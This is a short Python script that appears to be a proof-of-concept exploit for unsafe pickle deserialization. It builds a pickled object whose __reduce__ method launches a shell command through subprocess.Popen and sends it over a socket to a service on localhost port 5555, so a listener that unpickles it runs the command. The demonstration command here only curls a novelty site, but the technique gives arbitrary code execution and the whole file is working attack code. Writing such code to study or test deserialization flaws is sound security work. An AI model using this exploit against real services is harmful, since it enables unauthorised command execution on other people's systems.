import pickle
import subprocess
import socket
from time import sleep


class silly(object):
    def __reduce__(self):
        return (subprocess.Popen, ('bash -c "curl parrot.live"',), {"shell": True})
    

data = pickle.dumps(silly())
sock = socket.socket()
sock.connect(("localhost", 5555))
sock.send(data)
sleep(1)
sock.close()